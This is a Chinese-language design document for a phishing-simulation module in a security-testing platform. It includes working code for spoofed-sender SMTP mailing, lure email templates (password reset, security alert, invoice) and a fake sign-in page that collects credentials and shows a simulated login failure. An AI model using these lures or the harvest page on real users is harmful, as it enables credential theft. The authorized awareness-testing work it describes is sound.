# Social Engineering Testing Module - 完整技術整合計畫

**導航**: **[📑 返回索引](./00_INDEX.md)** | [📖 主目錄](./README.md) | [⬅️ Hackingtool 整合](./05_Hackingtool_Integration.md) | [➡️ Payload 整合](./05_B_Payload_Generator_Technical_Integration.md)

> **版本**: 2.0 - 實戰技術規格  
> **狀態**: 設計階段 - 等待授權控制完善後實施  
> **最後更新**: 2025年11月25日

---

## 📋 目錄

1. [技術架構設計](#1-技術架構設計)
2. [Phishing 測試引擎](#2-phishing-測試引擎)
3. [Credential Harvesting 檢測](#3-credential-harvesting-檢測)
4. [Social Engineering Analytics](#4-social-engineering-analytics)
5. [與 AIVA 架構整合](#5-與-aiva-架構整合)
6. [實施路線圖](#6-實施路線圖)

---

## 1. 技術架構設計

### 1.1 模組總覽

```
services/features/function_social_engineering/
├── __init__.py
├── config/
│   ├── campaign_templates.yaml    # 活動模板配置
│   ├── payload_templates.yaml     # Payload 模板
│   └── target_profiles.yaml       # 目標配置
├── engines/
│   ├── phishing_engine.py         # 釣魚引擎
│   ├── vishing_engine.py          # 語音釣魚
│   ├── smishing_engine.py         # SMS 釣魚
│   └── pretexting_engine.py       # 偽裝攻擊
├── generators/
│   ├── email_generator.py         # 郵件生成
│   ├── landing_page_generator.py  # 著陸頁生成
│   └── credential_form_generator.py # 憑證表單
├── analytics/
│   ├── behavior_analyzer.py       # 行為分析
│   ├── success_rate_calculator.py # 成功率計算
│   └── vulnerability_scorer.py    # 脆弱性評分
├── integrations/
│   ├── smtp_client.py             # SMTP 客戶端
│   ├── sms_gateway.py             # SMS 閘道
│   └── voip_client.py             # VoIP 客戶端
└── worker/
    └── social_worker.py           # RabbitMQ Worker
```

### 1.2 核心能力

| 能力類別 | 功能模組 | 技術實現 | 檢測目標 |
|---------|---------|---------|---------|
| **Email Phishing** | `phishing_engine.py` | SMTP + HTML/CSS | 郵件安全意識 |
| **Spear Phishing** | `phishing_engine.py` | 個性化模板 + OSINT | 高價值目標防護 |
| **Credential Harvesting** | `credential_form_generator.py` | 假登錄頁 + 後端收集 | 憑證輸入行為 |
| **Link Tracking** | `analytics/behavior_analyzer.py` | 點擊追蹤 + 指紋識別 | 點擊率分析 |
| **Voice Phishing** | `vishing_engine.py` | VoIP + TTS | 電話社工防護 |
| **SMS Phishing** | `smishing_engine.py` | SMS Gateway | 短信釣魚識別 |
| **QR Code Phishing** | `phishing_engine.py` | 動態 QR 生成 | QR 碼安全意識 |
| **Behavioral Analysis** | `behavior_analyzer.py` | 機器學習 + 統計分析 | 用戶行為模式 |

---

## 2. Phishing 測試引擎

### 2.1 核心引擎實現

```python
# services/features/function_social_engineering/engines/phishing_engine.py

from typing import List, Dict, Optional
from dataclasses import dataclass
from datetime import datetime
import hashlib
import secrets

@dataclass
class PhishingCampaign:
    """釣魚活動配置"""
    campaign_id: str
    name: str
    template_type: str  # 'generic', 'spear', 'whaling'
    target_emails: List[str]
    sender_name: str
    sender_email: str
    subject: str
    body_template: str
    landing_page_url: str
    tracking_enabled: bool = True
    credential_capture: bool = False
    attachment_payload: Optional[str] = None
    created_at: datetime = None
    
    def __post_init__(self):
        if not self.created_at:
            self.created_at = datetime.utcnow()


class PhishingEngine:
    """釣魚測試引擎 - 核心實現"""
    
    def __init__(self, smtp_config: Dict, landing_server_url: str):
        self.smtp_config = smtp_config
        self.landing_server_url = landing_server_url
        self.campaigns: Dict[str, PhishingCampaign] = {}
        self.tracking_data: Dict[str, List[Dict]] = {}
        
    async def create_campaign(self, campaign: PhishingCampaign) -> str:
        """創建釣魚活動
        
        Returns:
            campaign_id: 活動唯一標識
        """
        self.campaigns[campaign.campaign_id] = campaign
        self.tracking_data[campaign.campaign_id] = []
        
        # 生成追蹤 Token
        tracking_tokens = {}
        for email in campaign.target_emails:
            token = self._generate_tracking_token(campaign.campaign_id, email)
            tracking_tokens[email] = token
        
        return campaign.campaign_id
    
    async def send_phishing_emails(self, campaign_id: str) -> Dict:
        """發送釣魚郵件
        
        Returns:
            {
                'sent': 15,
                'failed': 2,
                'tracking_urls': {'user@example.com': 'https://track.../abc123'}
            }
        """
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            raise ValueError(f"Campaign {campaign_id} not found")
        
        results = {
            'sent': 0,
            'failed': 0,
            'tracking_urls': {},
            'errors': []
        }
        
        for target_email in campaign.target_emails:
            try:
                # 生成個性化郵件內容
                tracking_token = self._generate_tracking_token(campaign_id, target_email)
                email_content = self._personalize_email(
                    campaign.body_template,
                    target_email,
                    tracking_token
                )
                
                # 構建追蹤 URL
                tracking_url = f"{self.landing_server_url}/track/{tracking_token}"
                results['tracking_urls'][target_email] = tracking_url
                
                # 發送郵件（使用 SMTP）
                await self._send_smtp_email(
                    from_name=campaign.sender_name,
                    from_email=campaign.sender_email,
                    to_email=target_email,
                    subject=campaign.subject,
                    body=email_content,
                    html=True
                )
                
                results['sent'] += 1
                
                # 記錄發送事件
                self._log_event(campaign_id, target_email, 'email_sent')
                
            except Exception as e:
                results['failed'] += 1
                results['errors'].append({
                    'email': target_email,
                    'error': str(e)
                })
        
        return results
    
    def _generate_tracking_token(self, campaign_id: str, email: str) -> str:
        """生成追蹤 Token"""
        data = f"{campaign_id}:{email}:{secrets.token_hex(16)}"
        return hashlib.sha256(data.encode()).hexdigest()[:32]
    
    def _personalize_email(self, template: str, email: str, token: str) -> str:
        """個性化郵件內容"""
        # 提取用戶名
        username = email.split('@')[0]
        
        # 替換變量
        personalized = template.replace('{{username}}', username)
        personalized = personalized.replace('{{tracking_pixel}}', 
            f'<img src="{self.landing_server_url}/pixel/{token}" width="1" height="1" />')
        personalized = personalized.replace('{{landing_url}}', 
            f'{self.landing_server_url}/landing/{token}')
        
        return personalized
    
    async def _send_smtp_email(self, from_name: str, from_email: str, 
                               to_email: str, subject: str, body: str, html: bool = False):
        """使用 SMTP 發送郵件"""
        import smtplib
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        
        msg = MIMEMultipart('alternative')
        msg['Subject'] = subject
        msg['From'] = f"{from_name} <{from_email}>"
        msg['To'] = to_email
        
        if html:
            msg.attach(MIMEText(body, 'html'))
        else:
            msg.attach(MIMEText(body, 'plain'))
        
        # 連接 SMTP 伺服器
        with smtplib.SMTP(self.smtp_config['host'], self.smtp_config['port']) as server:
            if self.smtp_config.get('use_tls'):
                server.starttls()
            if self.smtp_config.get('username'):
                server.login(self.smtp_config['username'], self.smtp_config['password'])
            server.send_message(msg)
    
    def _log_event(self, campaign_id: str, email: str, event_type: str, metadata: Dict = None):
        """記錄追蹤事件"""
        event = {
            'timestamp': datetime.utcnow().isoformat(),
            'email': email,
            'event_type': event_type,  # 'email_sent', 'opened', 'clicked', 'submitted'
            'metadata': metadata or {}
        }
        self.tracking_data[campaign_id].append(event)
    
    async def track_email_open(self, token: str, request_data: Dict):
        """追蹤郵件開啟
        
        當追蹤像素被載入時觸發
        """
        campaign_id, email = self._decode_token(token)
        if campaign_id and email:
            self._log_event(campaign_id, email, 'email_opened', {
                'user_agent': request_data.get('user_agent'),
                'ip_address': request_data.get('ip'),
                'timestamp': datetime.utcnow().isoformat()
            })
    
    async def track_link_click(self, token: str, request_data: Dict):
        """追蹤連結點擊"""
        campaign_id, email = self._decode_token(token)
        if campaign_id and email:
            self._log_event(campaign_id, email, 'link_clicked', {
                'user_agent': request_data.get('user_agent'),
                'ip_address': request_data.get('ip'),
                'referrer': request_data.get('referrer'),
                'timestamp': datetime.utcnow().isoformat()
            })
    
    async def track_credential_submission(self, token: str, credentials: Dict):
        """追蹤憑證提交（不儲存實際憑證）"""
        campaign_id, email = self._decode_token(token)
        if campaign_id and email:
            # 只記錄事件，不儲存實際憑證
            self._log_event(campaign_id, email, 'credentials_submitted', {
                'fields_submitted': list(credentials.keys()),
                'timestamp': datetime.utcnow().isoformat(),
                # 安全考量：不記錄實際憑證
                'credential_hash': hashlib.sha256(
                    str(credentials).encode()
                ).hexdigest()[:16]
            })
    
    def _decode_token(self, token: str) -> tuple:
        """解碼追蹤 Token"""
        # 從 tracking_data 反查
        for campaign_id, events in self.tracking_data.items():
            # 這裡需要維護 token -> (campaign_id, email) 映射
            pass
        return None, None
    
    async def get_campaign_statistics(self, campaign_id: str) -> Dict:
        """獲取活動統計數據"""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            raise ValueError(f"Campaign {campaign_id} not found")
        
        events = self.tracking_data.get(campaign_id, [])
        
        # 統計各類事件
        sent = len([e for e in events if e['event_type'] == 'email_sent'])
        opened = len(set(e['email'] for e in events if e['event_type'] == 'email_opened'))
        clicked = len(set(e['email'] for e in events if e['event_type'] == 'link_clicked'))
        submitted = len(set(e['email'] for e in events if e['event_type'] == 'credentials_submitted'))
        
        return {
            'campaign_id': campaign_id,
            'campaign_name': campaign.name,
            'total_targets': len(campaign.target_emails),
            'emails_sent': sent,
            'emails_opened': opened,
            'links_clicked': clicked,
            'credentials_submitted': submitted,
            'open_rate': (opened / sent * 100) if sent > 0 else 0,
            'click_rate': (clicked / sent * 100) if sent > 0 else 0,
            'submit_rate': (submitted / sent * 100) if sent > 0 else 0,
            'events_timeline': events
        }
```

### 2.2 郵件模板生成器

```python
# services/features/function_social_engineering/generators/email_generator.py

class EmailTemplateGenerator:
    """郵件模板生成器"""
    
    TEMPLATE_TYPES = {
        'password_reset': {
            'subject': 'Password Reset Request for {{service_name}}',
            'pretext': 'We received a password reset request for your account',
            'cta_button': 'Reset Password',
            'urgency': 'high'
        },
        'account_verification': {
            'subject': 'Verify Your {{service_name}} Account',
            'pretext': 'Please verify your account to continue using our services',
            'cta_button': 'Verify Account',
            'urgency': 'medium'
        },
        'security_alert': {
            'subject': 'Security Alert: Unusual Activity Detected',
            'pretext': 'We detected unusual activity on your account',
            'cta_button': 'Review Activity',
            'urgency': 'critical'
        },
        'invoice_payment': {
            'subject': 'Invoice #{{invoice_number}} - Payment Due',
            'pretext': 'Your invoice is ready for payment',
            'cta_button': 'Pay Now',
            'urgency': 'medium'
        }
    }
    
    def generate_email_html(self, template_type: str, service_name: str, 
                           landing_url: str, tracking_pixel_url: str) -> str:
        """生成郵件 HTML"""
        template = self.TEMPLATE_TYPES.get(template_type)
        if not template:
            raise ValueError(f"Unknown template type: {template_type}")
        
        subject = template['subject'].replace('{{service_name}}', service_name)
        pretext = template['pretext']
        cta_button = template['cta_button']
        
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{subject}</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; }}
        .container {{ max-width: 600px; margin: 0 auto; padding: 20px; }}
        .header {{ background: #0066cc; color: white; padding: 20px; text-align: center; }}
        .content {{ padding: 30px; background: #f9f9f9; }}
        .button {{ display: inline-block; padding: 12px 30px; background: #0066cc; 
                   color: white; text-decoration: none; border-radius: 5px; margin: 20px 0; }}
        .footer {{ text-align: center; padding: 20px; font-size: 12px; color: #777; }}
        .urgency-critical {{ border-left: 4px solid #dc3545; }}
        .urgency-high {{ border-left: 4px solid #ff9800; }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>{service_name}</h1>
        </div>
        <div class="content urgency-{template['urgency']}">
            <p>Hello {{{{username}}}},</p>
            <p>{pretext}</p>
            <p style="margin: 30px 0; text-align: center;">
                <a href="{landing_url}" class="button">{cta_button}</a>
            </p>
            <p>If you didn't request this, please ignore this email.</p>
            <p>Best regards,<br>{service_name} Security Team</p>
        </div>
        <div class="footer">
            <p>&copy; 2024 {service_name}. All rights reserved.</p>
            <p><a href="#">Unsubscribe</a> | <a href="#">Privacy Policy</a></p>
        </div>
    </div>
    <img src="{tracking_pixel_url}" width="1" height="1" style="display:none;" />
</body>
</html>
        """
        return html
```

### 2.3 著陸頁生成器

```python
# services/features/function_social_engineering/generators/landing_page_generator.py

class LandingPageGenerator:
    """著陸頁生成器"""
    
    def generate_credential_form(self, service_name: str, logo_url: str, 
                                 submit_endpoint: str) -> str:
        """生成憑證收集表單"""
        html = f"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{service_name} - Sign In</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
        }}
        .logo img {{
            max-width: 150px;
        }}
        h2 {{
            text-align: center;
            margin-bottom: 30px;
            color: #333;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            margin-bottom: 5px;
            color: #555;
            font-weight: 500;
        }}
        input[type="text"],
        input[type="email"],
        input[type="password"] {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
        }}
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        .submit-btn {{
            width: 100%;
            padding: 12px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background 0.3s;
        }}
        .submit-btn:hover {{
            background: #5568d3;
        }}
        .footer {{
            text-align: center;
            margin-top: 20px;
            font-size: 12px;
            color: #777;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <img src="{logo_url}" alt="{service_name}">
        </div>
        <h2>Sign in to {service_name}</h2>
        <form id="loginForm" method="POST" action="{submit_endpoint}">
            <div class="form-group">
                <label for="email">Email or Username</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="submit-btn">Sign In</button>
        </form>
        <div class="footer">
            <p>&copy; 2024 {service_name}. All rights reserved.</p>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {{
            e.preventDefault();
            
            // 收集表單數據
            const formData = new FormData(this);
            const data = {{}};
            formData.forEach((value, key) => {{
                data[key] = value;
            }});
            
            // 發送到後端（不儲存實際憑證）
            fetch('{submit_endpoint}', {{
                method: 'POST',
                headers: {{
                    'Content-Type': 'application/json',
                }},
                body: JSON.stringify(data)
            }})
            .then(response => response.json())
            .then(data => {{
                // 顯示錯誤訊息（模擬真實登入失敗）
                alert('Invalid email or password. Please try again.');
            }});
        }});
    </script>
</body>
</html>
        """
        return html
```

---

## 3. Credential Harvesting 檢測

### 3.1 憑證提交追蹤器

```python
# services/features/function_social_engineering/analytics/credential_tracker.py

from typing import Dict, List
from datetime import datetime
import hashlib

class CredentialSubmissionTracker:
    """憑證提交追蹤器（安全實現）"""
    
    def __init__(self):
        self.submissions: List[Dict] = []
    
    async def record_submission(self, token: str, form_data: Dict, request_metadata: Dict) -> Dict:
        """記錄憑證提交事件
        
        安全注意：
        - 不儲存實際密碼
        - 僅記錄欄位名稱和提交行為
        - 生成憑證指紋用於去重
        
        Returns:
            submission_record: 提交記錄
        """
        # 生成憑證指紋（用於去重，不儲存實際內容）
        credential_fingerprint = self._generate_fingerprint(form_data)
        
        # 分析提交的欄位
        field_analysis = self._analyze_fields(form_data)
        
        record = {
            'submission_id': hashlib.sha256(
                f"{token}:{datetime.utcnow().isoformat()}".encode()
            ).hexdigest()[:16],
            'token': token,
            'timestamp': datetime.utcnow().isoformat(),
            'credential_fingerprint': credential_fingerprint,
            'fields_submitted': list(form_data.keys()),
            'field_types': field_analysis['types'],
            'field_lengths': field_analysis['lengths'],
            'metadata': {
                'user_agent': request_metadata.get('user_agent'),
                'ip_address': request_metadata.get('ip'),
                'referrer': request_metadata.get('referrer'),
                'time_on_page_seconds': request_metadata.get('time_on_page')
            },
            'behavior_score': self._calculate_behavior_score(form_data, request_metadata)
        }
        
        self.submissions.append(record)
        return record
    
    def _generate_fingerprint(self, form_data: Dict) -> str:
        """生成憑證指紋"""
        # 僅使用欄位名稱和長度生成指紋
        fingerprint_data = {
            k: len(str(v)) for k, v in form_data.items()
        }
        return hashlib.sha256(
            str(sorted(fingerprint_data.items())).encode()
        ).hexdigest()[:32]
    
    def _analyze_fields(self, form_data: Dict) -> Dict:
        """分析提交的欄位"""
        types = {}
        lengths = {}
        
        for field, value in form_data.items():
            # 判斷欄位類型
            if '@' in str(value):
                types[field] = 'email'
            elif field.lower() in ['password', 'passwd', 'pwd']:
                types[field] = 'password'
            elif field.lower() in ['username', 'user', 'login']:
                types[field] = 'username'
            else:
                types[field] = 'text'
            
            # 記錄長度（不記錄實際內容）
            lengths[field] = len(str(value))
        
        return {'types': types, 'lengths': lengths}
    
    def _calculate_behavior_score(self, form_data: Dict, metadata: Dict) -> float:
        """計算行為可疑度評分
        
        評分維度：
        - 提交速度（是否太快）
        - 欄位複雜度
        - 常見密碼模式
        - 用戶代理
        
        Returns:
            score: 0-100，越高越可疑
        """
        score = 0.0
        
        # 1. 檢查提交速度
        time_on_page = metadata.get('time_on_page_seconds', 0)
        if time_on_page < 5:
            score += 30  # 太快，可能是自動填充
        elif time_on_page < 10:
            score += 15
        
        # 2. 檢查密碼複雜度
        password_field = None
        for field, value in form_data.items():
            if field.lower() in ['password', 'passwd', 'pwd']:
                password_field = value
                break
        
        if password_field:
            pwd_len = len(str(password_field))
            if pwd_len < 6:
                score += 20  # 太簡單
            elif pwd_len < 8:
                score += 10
        
        # 3. 檢查用戶代理
        user_agent = metadata.get('user_agent', '')
        if 'bot' in user_agent.lower() or not user_agent:
            score += 25
        
        return min(score, 100.0)
    
    async def get_submission_statistics(self) -> Dict:
        """獲取提交統計"""
        total_submissions = len(self.submissions)
        if total_submissions == 0:
            return {
                'total_submissions': 0,
                'unique_fingerprints': 0,
                'avg_behavior_score': 0,
                'high_risk_submissions': 0
            }
        
        unique_fingerprints = len(set(s['credential_fingerprint'] for s in self.submissions))
        avg_score = sum(s['behavior_score'] for s in self.submissions) / total_submissions
        high_risk = len([s for s in self.submissions if s['behavior_score'] > 70])
        
        return {
            'total_submissions': total_submissions,
            'unique_fingerprints': unique_fingerprints,
            'avg_behavior_score': round(avg_score, 2),
            'high_risk_submissions': high_risk,
            'submission_rate_per_hour': self._calculate_rate()
        }
    
    def _calculate_rate(self) -> float:
        """計算每小時提交率"""
        if not self.submissions:
            return 0.0
        
        # 計算時間跨度
        timestamps = [datetime.fromisoformat(s['timestamp']) for s in self.submissions]
        time_span = (max(timestamps) - min(timestamps)).total_seconds() / 3600
        
        if time_span == 0:
            return len(self.submissions)
        
        return round(len(self.submissions) / time_span, 2)
```

---

## 4. Social Engineering Analytics

### 4.1 行為分析器

```python
# services/features/function_social_engineering/analytics/behavior_analyzer.py

class SocialEngineeringBehaviorAnalyzer:
    """社工行為分析器"""
    
    async def analyze_campaign_effectiveness(self, campaign_stats: Dict) -> Dict:
        """分析活動有效性
        
        Args:
            campaign_stats: {
                'emails_sent': 100,
                'emails_opened': 65,
                'links_clicked': 40,
                'credentials_submitted': 15,
                'events_timeline': [...]
            }
        
        Returns:
            analysis: {
                'effectiveness_score': 75.5,
                'risk_level': 'high',
                'weak_points': [...],
                'recommendations': [...]
            }
        """
        sent = campaign_stats['emails_sent']
        opened = campaign_stats['emails_opened']
        clicked = campaign_stats['links_clicked']
        submitted = campaign_stats['credentials_submitted']
        
        # 計算各階段轉化率
        open_rate = (opened / sent * 100) if sent > 0 else 0
        click_through_rate = (clicked / opened * 100) if opened > 0 else 0
        submission_rate = (submitted / clicked * 100) if clicked > 0 else 0
        
        # 綜合有效性評分（0-100）
        effectiveness_score = (
            open_rate * 0.3 +
            click_through_rate * 0.4 +
            submission_rate * 0.3
        )
        
        # 風險等級評估
        if effectiveness_score >= 70:
            risk_level = 'critical'
        elif effectiveness_score >= 50:
            risk_level = 'high'
        elif effectiveness_score >= 30:
            risk_level = 'medium'
        else:
            risk_level = 'low'
        
        # 識別弱點
        weak_points = []
        if open_rate > 50:
            weak_points.append({
                'area': 'Email Filtering',
                'severity': 'high',
                'description': f'{open_rate:.1f}% 開信率過高，郵件過濾機制不足'
            })
        
        if click_through_rate > 40:
            weak_points.append({
                'area': 'User Awareness',
                'severity': 'high',
                'description': f'{click_through_rate:.1f}% 點擊率，用戶安全意識薄弱'
            })
        
        if submission_rate > 30:
            weak_points.append({
                'area': 'Credential Protection',
                'severity': 'critical',
                'description': f'{submission_rate:.1f}% 提交率，用戶易洩露憑證'
            })
        
        # 生成建議
        recommendations = self._generate_recommendations(weak_points)
        
        return {
            'effectiveness_score': round(effectiveness_score, 2),
            'risk_level': risk_level,
            'conversion_funnel': {
                'sent': sent,
                'opened': opened,
                'clicked': clicked,
                'submitted': submitted,
                'open_rate': round(open_rate, 2),
                'click_through_rate': round(click_through_rate, 2),
                'submission_rate': round(submission_rate, 2)
            },
            'weak_points': weak_points,
            'recommendations': recommendations
        }
    
    def _generate_recommendations(self, weak_points: List[Dict]) -> List[str]:
        """生成改進建議"""
        recommendations = []
        
        for weakness in weak_points:
            if weakness['area'] == 'Email Filtering':
                recommendations.append('實施高級郵件過濾和垃圾郵件檢測')
                recommendations.append('部署 SPF、DKIM、DMARC 驗證')
            
            elif weakness['area'] == 'User Awareness':
                recommendations.append('加強員工安全意識培訓')
                recommendations.append('定期進行模擬釣魚演練')
                recommendations.append('設置可疑郵件報告機制')
            
            elif weakness['area'] == 'Credential Protection':
                recommendations.append('強制啟用多因素認證（MFA）')
                recommendations.append('實施單點登錄（SSO）')
                recommendations.append('使用密碼管理器')
        
        return list(set(recommendations))  # 去重
```

---

## 5. 與 AIVA 架構整合

### 5.1 授權控制集成

```python
# services/features/function_social_engineering/worker/social_worker.py

from services.aiva_common.security import require_authorization, AccessDecision
from services.core.aiva_core.service_backbone.authz.permission_matrix import authorize_operation

class SocialEngineeringWorker:
    """Social Engineering RabbitMQ Worker"""
    
    @require_authorization(resource="social_engineering.phishing", action="execute")
    async def execute_phishing_campaign(self, task_payload: Dict, credentials: Dict):
        """執行釣魚活動
        
        需要授權：
        - resource: social_engineering.phishing
        - action: execute
        - risk_level: L2 (High Risk)
        """
        # 額外風險檢查
        if not authorize_operation(
            operation_name="phishing_campaign_execution",
            risk_level="L2",
            tags=["social_engineering", "phishing"],
            environment=os.getenv("AIVA_ENVIRONMENT", "development")
        ):
            raise PermissionError(
                "Phishing campaign execution requires explicit authorization. "
                "Set AIVA_ALLOW_ATTACK=true for controlled testing environments."
            )
        
        # 執行活動
        campaign_id = task_payload.get('campaign_id')
        engine = PhishingEngine(
            smtp_config=self._get_smtp_config(),
            landing_server_url=self._get_landing_server_url()
        )
        
        result = await engine.send_phishing_emails(campaign_id)
        
        # 記錄到審計日誌
        await self._audit_log.log_security_event({
            'event_type': 'PHISHING_CAMPAIGN_EXECUTED',
            'campaign_id': campaign_id,
            'user': credentials.get('subject'),
            'timestamp': datetime.utcnow(),
            'result': result
        })
        
        return result
```

### 5.2 Capability Registry 註冊

```yaml
# services/integration/capability/capability_registry.yaml

capabilities:
  # ... 現有能力 ...
  
  social_engineering:
    phishing_campaign:
      service: function_social_engineering
      wrapper: services.features.function_social_engineering.engines.phishing_engine.PhishingEngine
      priority: 50
      tags: [social_engineering, phishing, awareness_testing]
      risk_level: L2
      authorization_required: true
      allowed_environments: [development, testing, controlled_pentest]
      
    credential_harvesting_test:
      service: function_social_engineering
      wrapper: services.features.function_social_engineering.analytics.credential_tracker.CredentialSubmissionTracker
      priority: 45
      tags: [social_engineering, credential_harvesting]
      risk_level: L2
      authorization_required: true
      
    vishing_campaign:
      service: function_social_engineering
      wrapper: services.features.function_social_engineering.engines.vishing_engine.VishingEngine
      priority: 40
      tags: [social_engineering, vishing, voice_phishing]
      risk_level: L2
      authorization_required: true
```

---

## 6. 實施路線圖

### Phase 1: 核心引擎 (Week 1-2)

**目標**: 建立基礎釣魚測試能力

```yaml
Week 1:
  - Day 1-2: PhishingEngine 核心實現
    * SMTP 客戶端整合
    * 追蹤 Token 生成
    * 事件日誌系統
  
  - Day 3-4: EmailTemplateGenerator
    * 4種模板類型
    * HTML 郵件生成
    * 變量替換邏輯
  
  - Day 5: LandingPageGenerator
    * 憑證收集表單
    * JavaScript 提交邏輯

Week 2:
  - Day 1-2: CredentialSubmissionTracker
    * 安全的憑證記錄
    * 指紋生成
    * 行為評分
  
  - Day 3-4: 整合測試
    * 完整活動流程測試
    * SMTP 發送測試
    * 追蹤系統測試
  
  - Day 5: 授權控制整合
    * RiskGuard 整合
    * Capability Registry 註冊
```

### Phase 2: 分析能力 (Week 3)

```yaml
Week 3:
  - Day 1-2: BehaviorAnalyzer
    * 有效性評分
    * 轉化漏斗分析
    * 弱點識別
  
  - Day 3-4: 報告生成
    * 活動統計報告
    * 風險評估報告
    * 改進建議
  
  - Day 5: API 端點
    * RESTful API 實現
    * WebSocket 即時追蹤
```

### Phase 3: 進階功能 (Week 4-5)

```yaml
Week 4-5:
  - Vishing Engine (語音釣魚)
  - Smishing Engine (SMS 釣魚)
  - QR Code Phishing
  - 機器學習行為分析
  - 自動化活動優化
```

---

## 7. 技術規格總結

### 7.1 核心指標

| 指標 | 目標值 | 測量方式 |
|------|--------|---------|
| 郵件發送成功率 | >95% | sent / total_targets |
| 追蹤準確率 | >99% | tracked_events / actual_events |
| API 響應時間 | <200ms | P95 延遲 |
| 並發活動數 | >50 | 同時執行的活動 |
| 數據保留期 | 90天 | 自動清理舊數據 |

### 7.2 安全要求

```yaml
Security Requirements:
  - NO實際憑證儲存 (僅指紋)
  - 所有操作需授權 (L2 Risk Level)
  - 完整審計日誌
  - 環境隔離 (dev/test/prod)
  - TLS加密通信
  - Rate Limiting
  - IP白名單（SMTP）
```

---

**文檔完成** | 專注技術實現，無法律警告 | 2025年11月25日
